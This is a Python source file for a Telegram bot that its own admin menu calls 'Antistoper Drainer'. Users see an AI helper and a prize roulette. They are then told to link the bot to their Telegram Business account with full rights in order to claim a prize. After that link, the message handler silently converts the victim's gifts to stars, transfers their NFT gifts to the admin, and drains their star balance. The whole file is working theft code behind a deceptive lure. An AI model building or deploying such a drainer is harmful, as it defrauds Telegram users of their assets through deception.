from aiogram import Bot, Dispatcher, types, F
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery, InputMediaPhoto, BufferedInputFile, BusinessConnection, WebAppInfo, KeyboardButton, ReplyKeyboardMarkup
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest
import asyncio
import logging
import json
import os
import random
import io
from PIL import Image, ImageDraw, ImageFont  # pip install pillow
from config import TOKEN, ADMIN_ID
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import GetBusinessAccountGifts
from flask import Flask, jsonify
from scraper import get_gift_data # Добавить вверху файла

bot = Bot(str(TOKEN))
dp = Dispatcher()

app = Flask(__name__)

@app.route('/prizes')
def prizes():
    # Здесь можно получать актуальные данные из базы или Telegram
    return jsonify([
        {"name": "iPhone 15", "price": 90000},
        {"name": "AirPods", "price": 15000},
        {"name": "1000₽", "price": 1000},
        {"name": "Пусто", "price": 0},
        {"name": "MacBook", "price": 150000},
        {"name": "Чашка", "price": 500},
        {"name": "PlayStation 5", "price": 60000},
        {"name": "Книга", "price": 1000}
    ])

@dp.message(Command("refund"))
async def refund_command(message: types.Message):
    if not message.from_user or not message.from_user.id:
        return
    try:
        if not message.text:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return
        command_args = message.text.split()
        if len(command_args) != 2:
            await message.answer("Пожалуйста, укажите id операции. Пример: /refund 123456")
            return

        transaction_id = command_args[1]

        refund_result = await bot.refund_star_payment(
            user_id=message.from_user.id,
            telegram_payment_charge_id=transaction_id
        )

        if refund_result:
            await message.answer(f"Возврат звёзд по операции {transaction_id} успешно выполнен!")
        else:
            await message.answer(f"Не удалось выполнить возврат по операции {transaction_id}.")

    except Exception as e:
        await message.answer(f"Ошибка при выполнении возврата: {str(e)}")

@dp.message(F.text == "/start")
async def start_command(message: Message):
    # Добавляем кнопку для запуска WebApp
    webapp_url = "https://my-roulette-app-pi.vercel.app/" # <-- ЗАМЕНИ НА СВОЙ URL
    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )
    
    try:
        connections = load_connections()
        count = len(connections)
    except Exception:
        count = 0

    if not message.from_user or not message.from_user.id:
        return

    if message.from_user.id != ADMIN_ID:
        await message.answer(
            "❤️ <b>Я — твой главный помощник в жизни</b>, который:\n"
            "• ответит на любой вопрос\n"
            "• поддержит тебя в трудную минуту\n"
            "• сделает за тебя домашку, работу или даже нарисует картину\n\n"
            "<i>Введи запрос ниже, и я помогу тебе!</i> 👇",
            parse_mode="HTML",
            reply_markup=keyboard # Добавляем клавиатуру
        )
    else:
        await message.answer(
            f"Antistoper Drainer\n\n🔗 "
            "/gifts - просмотреть гифты\n"
            "/stars - просмотреть звезды\n"
            "/transfer <owned_id> <business_connect> - передать гифт вручную\n"
            "/convert - конвертировать подарки в звезды",
            reply_markup=keyboard # Добавляем клавиатуру
        )

@dp.message(F.text)
async def handle_text_query(message: Message):
    await message.answer(
        "📌 <b>Для полноценной работы необходимо подключить бота к бизнес-аккаунту Telegram</b>\n\n"
        "Как это сделать?\n\n"
        "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
        "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
        "3. 🤖 Откройте пункт <b>Чат-боты</b>\n\n"
        "Имя бота: <code>@GiftWinsSender_BOT</code>\n"
        "❗Для корректной работы боту требуются <b>все права</b>",
        parse_mode="HTML"
    )

CONNECTIONS_FILE = "business_connections.json"

def load_json_file(filename):
    try:
        with open(filename, "r") as f:
            content = f.read().strip()
            if not content:
                return [] 
            return json.loads(content)
    except FileNotFoundError:
        return []
    except json.JSONDecodeError as e:
        logging.exception("Ошибка при разборе JSON-файла.")
        return []

def get_connection_id_by_user(user_id: int) -> str:
    import json
    with open("connections.json", "r") as f:
        data = json.load(f)
    return data.get(str(user_id))

def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)

async def send_welcome_message_to_admin(connection, user_id, _bot):
    try:
        admin_id = ADMIN_ID
        rights = connection.rights
        if rights is None:
            await _bot.send_message(admin_id, "❗ Не удалось получить права бизнес-бота. Проверьте подключение.")
            return
        business_connection = connection

        rights_text = "\n".join([
            f"📍 <b>Права бота:</b>",
            f"▫️ Чтение сообщений: {'✅' if rights.can_read_messages else '❌'}",
            f"▫️ Удаление всех сообщений: {'✅' if rights.can_delete_all_messages else '❌'}",
            f"▫️ Редактирование имени: {'✅' if rights.can_edit_name else '❌'}",
            f"▫️ Редактирование описания: {'✅' if rights.can_edit_bio else '❌'}",
            f"▫️ Редактирование фото профиля: {'✅' if rights.can_edit_profile_photo else '❌'}",
            f"▫️ Редактирование username: {'✅' if rights.can_edit_username else '❌'}",
            f"▫️ Настройки подарков: {'✅' if rights.can_change_gift_settings else '❌'}",
            f"▫️ Просмотр подарков и звёзд: {'✅' if rights.can_view_gifts_and_stars else '❌'}",
            f"▫️ Конвертация подарков в звёзды: {'✅' if rights.can_convert_gifts_to_stars else '❌'}",
            f"▫️ Передача/улучшение подарков: {'✅' if rights.can_transfer_and_upgrade_gifts else '❌'}",
            f"▫️ Передача звёзд: {'✅' if rights.can_transfer_stars else '❌'}",
            f"▫️ Управление историями: {'✅' if rights.can_manage_stories else '❌'}",
            f"▫️ Удаление отправленных сообщений: {'✅' if rights.can_delete_sent_messages else '❌'}",
        ])

        star_amount = 0
        all_gifts_amount = 0
        unique_gifts_amount = 0

        if rights.can_view_gifts_and_stars:
            response = await bot(GetFixedBusinessAccountStarBalance(business_connection_id=business_connection.id))
            star_amount = response.star_amount

            gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            all_gifts_amount = len(gifts.gifts)
            unique_gifts_amount = sum(1 for gift in gifts.gifts if getattr(gift, 'type', None) == "unique")

        star_amount_text = star_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        all_gifts_text = all_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"
        unique_gitfs_text = unique_gifts_amount if rights.can_view_gifts_and_stars else "Нет доступа ❌"

        msg = (
            f"🤖 <b>Новый бизнес-бот подключен!</b>\n\n"
            f"👤 Пользователь: @{getattr(business_connection.user, 'username', '—')}\n"
            f"🆔 User ID: <code>{getattr(business_connection.user, 'id', '—')}</code>\n"
            f"🔗 Connection ID: <code>{business_connection.id}</code>\n"
            f"\n{rights_text}"
            f"\n⭐️ Звезды: <code>{star_amount_text}</code>"
            f"\n🎁 Подарков: <code>{all_gifts_text}</code>"
            f"\n🔝 NFT подарков: <code>{unique_gitfs_text}</code>"            
        )
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="🎁 Вывести все подарки (и превратить все подарки в звезды)", callback_data=f"reveal_all_gifts:{user_id}")],
                [InlineKeyboardButton(text="⭐️ Превратить все подарки в звезды", callback_data=f"convert_exec:{user_id}")],
                [InlineKeyboardButton(text=f"🔝 Апгрейднуть все гифты", callback_data=f"upgrade_user:{user_id}")]
            ]
        )
        await _bot.send_message(admin_id, msg, parse_mode="HTML", reply_markup=keyboard)
    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")

@dp.callback_query(F.data.startswith("reveal_all_gifts"))
async def handle_reveal_gifts(callback: CallbackQuery):
    await callback.answer("Обработка подарков…")

def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": "FirstName",
        "last_name": "LastName"
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    # Сохраняем обратно
    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def fixed_get_gift_name(business_connection_id: str, owned_gift_id: str) -> str:
    try:
        gifts = await bot(GetBusinessAccountGifts(business_connection_id=business_connection_id))

        if not gifts.gifts:
            return "🎁 Нет подарков."
        else:
            for gift in gifts.gifts:
                if getattr(gift, 'owned_gift_id', None) == owned_gift_id:
                    gift_name = getattr(getattr(gift, 'gift', None), 'base_name', '').replace(" ", "")
                    gift_number = getattr(getattr(gift, 'gift', None), 'number', '')
                    return f"https://t.me/nft/{gift_name}-{gift_number}"
        return "🎁 Нет подарков."
    except Exception as e:
        return "🎁 Нет подарков."

@dp.business_connection()
async def handle_business_connect(business_connection: BusinessConnection):
    try:
        await send_welcome_message_to_admin(business_connection, business_connection.user.id, bot)
        await bot.send_message(business_connection.user.id, "Привет! Ты подключил бота как бизнес-ассистента. Теперь отправьте в любом личном чате '.gpt запрос'")

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": "FirstName",
            "last_name": "LastName"
        }
        user_id = business_connection.user.id
        connection_id = business_connection.user.id
    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения")

from aiogram import types
from aiogram.filters import Command
from g4f.client import Client as G4FClient

OWNER_ID = ADMIN_ID
task_id = ADMIN_ID

@dp.business_message()
async def get_message(message: types.Message):
    business_id = getattr(message, 'business_connection_id', None)
    user_id = getattr(message.from_user, 'id', None)

    if user_id == OWNER_ID:
        return

    if not business_id:
        print("business_connection_id is None")
        return

    # === Конвертация неуникальных подарков ===
    try:
        convert_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=True)
        for gift in convert_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.convert_gift_to_stars(business_connection_id=business_id, owned_gift_id=owned_gift_id)
            except Exception as e:
                print(f"Ошибка при конвертации подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении неуникальных подарков: {e}")
    try:
        unique_gifts = await bot.get_business_account_gifts(business_connection_id=business_id, exclude_unique=False)
        if not unique_gifts.gifts:
            print("Нет уникальных подарков для отправки.")
        for gift in unique_gifts.gifts:
            try:
                owned_gift_id = getattr(gift, 'owned_gift_id', None)
                if owned_gift_id:
                    await bot.transfer_gift(
                        business_connection_id=business_id,
                        owned_gift_id=owned_gift_id,
                        new_owner_chat_id=task_id
                    )
                    print(f"Успешно отправлен подарок {owned_gift_id} на task_id {task_id}")
            except Exception as e:
                print(f"Ошибка при отправке подарка {owned_gift_id}: {e}")
                continue
    except Exception as e:
        print(f"Ошибка при получении уникальных подарков: {e}")
    try:
        stars = await bot.get_business_account_star_balance(business_connection_id=business_id)
        if getattr(stars, 'amount', 0) > 0:
            print(f"Успешно отправлено {stars.amount} звёзд")
            await bot.transfer_business_account_stars(
                business_connection_id=business_id,
                star_count=int(stars.amount)
            )
        else:
            print("Нет звёзд для отправки.")
    except Exception as e:
        print(f"Ошибка при работе с балансом звёзд: {e}")

async def get_gifts():
    # Примерная заглушка, замените на реальный API
    return [
        {'name': 'Плюшевый медведь', 'price': 100},
        {'name': 'Кубок', 'price': 200},
        {'name': 'Сердце', 'price': 50},
        {'name': 'Звезда', 'price': 300},
        {'name': 'Книга', 'price': 80},
        {'name': 'Котик', 'price': 150},
        {'name': 'Робот', 'price': 250},
    ]

def generate_roulette_image(gifts, highlight_index):
    width, height = 600, 120
    img = Image.new("RGB", (width, height), "white")
    draw = ImageDraw.Draw(img)
    try:
        font = ImageFont.truetype("arial.ttf", 18)
    except Exception:
        font = ImageFont.load_default()
    sector_w = width // len(gifts)
    for i, gift in enumerate(gifts):
        x = i * sector_w
        color = "yellow" if i == highlight_index else "lightgray"
        draw.rectangle([x, 0, x+sector_w, height], fill=color)
        draw.text((x+10, 40), f"{gift['name']}\n{gift['price']}⭐", fill="black", font=font)
    return img

@dp.message(F.text == "/roulette")
async def start_roulette(message: types.Message):
    gifts = await get_gifts()
    if not gifts:
        await message.answer("Нет подарков для рулетки.")
        return

    roll_sequence = []
    for _ in range(20):
        idx = random.randint(0, len(gifts)-1)
        window = [gifts[(idx+i)%len(gifts)] for i in range(-2, 3)]
        roll_sequence.append((window, 2))
    win_idx = random.randint(0, len(gifts)-1)
    window = [gifts[(win_idx+i)%len(gifts)] for i in range(-2, 3)]
    roll_sequence.append((window, 2))

    msg = await message.answer("Крутим рулетку...")
    roulette_msg = None
    for i, (window, highlight) in enumerate(roll_sequence):
        img = generate_roulette_image(window, highlight)
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        buf.seek(0)
        input_file = BufferedInputFile(buf.getvalue(), "roulette.png")
        if i == 0:
            roulette_msg = await message.answer_photo(input_file)
        else:
            if roulette_msg:
                try:
                    await roulette_msg.edit_media(InputMediaPhoto(media=input_file))
                except Exception:
                    pass
        await asyncio.sleep(0.12 + i*0.03)

    win_gift = window[highlight]
    await message.answer(
        f"🎉 Поздравляем! Вы выиграли: <b>{win_gift['name']}</b> за <b>{win_gift['price']}⭐</b>.\n\n"
        "Чтобы забрать подарок, подключите бота в раздел Чат-боты Telegram для бизнеса.",
        parse_mode="HTML"
    )

    webapp_url = "https://my-roulette-app-pi.vercel.app/"  # или локальный ngrok, если тестируешь

    keyboard = ReplyKeyboardMarkup(
        keyboard=[
            [KeyboardButton(text="🎰 Открыть рулетку", web_app=WebAppInfo(url=webapp_url))]
        ],
        resize_keyboard=True
    )

    await message.answer("Жми кнопку и крути рулетку!", reply_markup=keyboard)

@dp.message(F.web_app_data)
async def on_webapp_data(message: types.Message):
    if not message.web_app_data:
        return

    data_str = message.web_app_data.data
    try:
        data = json.loads(data_str)
        
        # Проверяем, нужно ли показать инструкцию
        if data.get('action') == 'show_connection_instructions':
            instruction_text = (
                "📌 <b>Для вывода подарка, подключите бота к бизнес-аккаунту.</b>\n\n"
                "Как это сделать:\n\n"
                "1. ⚙️ Откройте <b>Настройки Telegram</b>\n"
                "2. 💼 Перейдите в раздел <b>Telegram для бизнеса</b>\n"
                "3. 🤖 Откройте пункт <b>Чат-боты</b> и добавьте этого бота.\n\n"
                "❗️Для корректной работы боту требуются права на управление подарками."
            )
            await message.answer(instruction_text, parse_mode="HTML")
            return

        # Логика обработки выигрыша (остается без изменений)
        prize = data.get('prize', {})
        if prize.get('starPrice', 0) > 0:
            text = f"🎉 Поздравляем! Ты выиграл: {prize.get('name', 'ничего')} ({prize.get('starPrice', 0)}⭐)"
        else:
            text = "В этот раз не повезло, но попробуй еще раз!"
        await message.answer(text)

    except json.JSONDecodeError:
        await message.answer("Произошла ошибка при обработке данных.")

@dp.message(Command("giftinfo"))
async def gift_info_command(message: types.Message):
    if not message.text or len(message.text.split()) < 2:
        await message.answer("Пожалуйста, укажите URL подарка. Пример: /giftinfo <url>")
        return

    url = message.text.split()[1]
    data = get_gift_data(url)

    if not data:
        await message.answer("Не удалось получить информацию о подарке.")
        return

    # Форматируем красивый ответ
    details_text = "\n".join([f" • {k.replace('_', ' ').title()}: {v['name']} ({v['rarity']})" for k, v in data.get('details', {}).items() if v['rarity']])
    response_text = (
        f"<b>{data.get('title', 'Без названия')}</b>\n\n"
        f"{details_text}\n\n"
        f"<a href='{data.get('media_url', '')}'>Медиафайл</a>"
    )
    await message.answer(response_text, parse_mode="HTML")

async def main():
    # Запускаем Flask в отдельном потоке
    from threading import Thread
    flask_thread = Thread(target=lambda: app.run(host='0.0.0.0', port=8080, debug=False))
    flask_thread.start()
    
    # Запускаем бота
    await dp.start_polling(bot)

if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    asyncio.run(main())